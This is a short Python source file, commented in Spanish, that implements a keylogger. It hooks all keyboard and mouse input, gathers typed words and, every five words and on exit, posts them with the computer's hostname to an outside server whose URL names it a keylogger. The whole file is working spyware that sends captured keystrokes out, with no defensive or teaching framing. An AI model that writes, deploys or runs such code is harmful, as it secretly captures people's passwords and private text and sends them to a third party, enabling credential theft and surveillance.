import keyboard
import mouse
import requests
import socket
import atexit

palabra = ""
line_count = 0

# Obtener el nombre del equipo
hostname = socket.gethostname()

# URL del servidor
server_url = "https://keylogger-production.up.railway.app"

def key(pulso):  # Función callback para detectar cuando se presiona una tecla
    global palabra
    if pulso.event_type == keyboard.KEY_DOWN:
        if pulso.name == "space":
            palabra += " "
            save_word()
        elif len(pulso.name) == 1 and pulso.name.isprintable():
            palabra += pulso.name


def on_click(click):  # Función callback para detectar cuando se presiona el click
    if isinstance(click, mouse.ButtonEvent):
        if click.event_type == "down":
            save_word()


keyboard.hook(key)
mouse.hook(on_click)


def save_word():  # Añade palabras y las envía al servidor
    global palabra, line_count

    line_count += 1

    if line_count >= 5:  # Enviar cada 5 palabras
        send_to_server(palabra)
        line_count = 0
        reset()


def send_to_server(data):  # Envía las palabras al servidor
    url = f"{server_url}/upload"
    try:
        response = requests.post(url, json={"hostname": hostname, "data": data})
        print(f"Respuesta del servidor: {response.text}")
    except requests.exceptions.RequestException as e:
        print(f"Error al enviar datos al servidor: {e}")


def reset():  # Resetea la palabra
    global palabra
    palabra = ""


# Detiene el script cuando se presiona Escape y llama a la función unhook_all()
try:
    keyboard.wait()
except KeyboardInterrupt:
    pass
finally:
    send_to_server(palabra)
    keyboard.unhook_all()
    mouse.unhook_all()